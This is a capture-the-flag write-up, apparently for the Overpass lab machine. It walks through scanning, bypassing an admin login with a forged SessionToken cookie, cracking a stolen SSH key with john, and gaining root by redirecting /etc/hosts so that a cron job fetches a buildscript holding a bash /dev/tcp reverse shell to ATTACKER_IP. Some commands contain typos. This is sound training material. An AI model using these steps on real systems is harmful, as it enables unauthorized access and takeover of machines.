- - - 
created : 17-07-2025 

Tags : #easy  
- - - 
# Objective

It's a [CTF](../../3%20-%20Tags/Hacking%20Concepts/CTF.md) so we catch them all.

# Recon
## Nmap

We can use [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) to scan the target :

```
    22/tcp open ssh
    80/tcp open http
```

# Enumeration
## Gobuster

Now we can use [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) to start [Enumeration](../../3%20-%20Tags/Hacking%20Concepts/Enumeration.md) :

```
    /admin
    /aboutus
```

visiting the /admin directory we find the login page for admins and in the /aboutus we find some names

- Ninja - Lead Developer
- Pars - Shibe Enthusiast and Emotional Support Animal Manager
- Szymex - Head Of Security
- Bee - Chief Drinking Water Coordinator
- MuirlandOracle - Cryptography Consultant

then we can look at the download of the Source code (go), we find another name (Steve) but nothing interesting

about, what is interesting here is the request for the name of the **login Cookie.**

# Exploit

For the [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) we have to Bypass login [Cookies](../../3%20-%20Tags/Hacking%20Concepts/Cookies.md) and we see in the [Source Code](../../3%20-%20Tags/Hacking%20Concepts/Source%20Code.md) that we need to modify the parameter name=SessionToken to bypass login credentials access, we can do it from our [Developer tools](../../3%20-%20Tags/Hacking%20Concepts/Developer%20tools.md) on browser and just set the cookie name to \*\*==SessionToken==\*\* reloading the page we have access and find the **id_rca** of James.

## Ssh2John

we can use [Ssh2john](../../3%20-%20Tags/Hacking%20Tools/Ssh2john.md) `ssh2john id_rsa > jamhash` and `john jamhash --wordlist=/usr/share/wordlists/rockyou.txt`  and find <span style="color: rgb(45, 194, 107);">james13</span>

## SSH

we need to make the  [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) key executable :  `chmod 600 id_rsa` than we can `ssh james id_rsa p: james13`  and `cat user.txt`

# Privilege Escalation

For the [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) we  `cat etc/crontab`  and we find **buildscript.sh** [Bash](../../3%20-%20Tags/Hacking%20Concepts/Bash.md) but cant modify it, we’ll need to find a way to put in some custom code to run as root .

we can `cat etc/hosts` and we can edit overpass.thm pointing to our[IP address](../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) using [Nano](../../3%20-%20Tags/Hacking%20Tools/Nano.md) 

## Create the BuildScript  

```
              mkdir -p downloads/src in attacker machine ;
              cd downloads/src ;
              bash -i >& /dev/tcp/(ATTACKER_IP)/8080 0>&1  
              chmod +x buildscript.sh
```

then we create a [Server](../../3%20-%20Tags/Hacking%20Concepts/Server.md) : `python3 -m http.server 80`  and open listener : `nc -lvpn 8080`

we will wait until it runs our script and then we’ll gain root access where we can find the flag as the root user in the root.txt file.

Pwned !!